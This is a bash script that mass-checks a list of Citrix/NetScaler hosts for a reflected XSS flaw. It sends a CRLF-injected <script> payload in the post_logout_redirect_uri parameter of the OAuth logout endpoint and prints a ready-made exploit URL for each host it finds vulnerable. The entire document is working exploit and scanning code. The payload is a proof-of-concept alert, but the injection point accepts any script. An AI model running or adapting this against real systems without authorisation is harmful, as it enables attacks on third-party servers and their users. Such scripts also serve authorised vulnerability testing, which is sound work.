#!/bin/bash
payload="/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>"
for i in $(cat citrix_urls.txt);
    do echo "[+] Checking reflected xss in citrix/netscalar at $i";
    echo ;
    k=$(curl "https://$i$payload" -s -k);
    j=$(curl "http://$i$payload" -s -k);
    t=$(echo $k | grep "document.domain");
    u=$(echo $j | grep "document.domain");
    if [ -z "$t" ];
    then
        echo "[-] HTTPS $i is Not Vulnerable";
    else
        echo "[+] HTTPS $i is Vulnerable to Reflected XSS!!";
        echo "[+] Payload : https://$i$payload";
    fi;
    if [ -z "$u" ];
    then
        echo "[-] HTTP $i is Not Vulnerable";
    else
        echo "[+] HTTP $i is Vulnerale to Reflected XSS!!";
        echo "[+] Payload : http://$i$payload";
    fi;
    echo "--------------------------------";
    echo ;
done
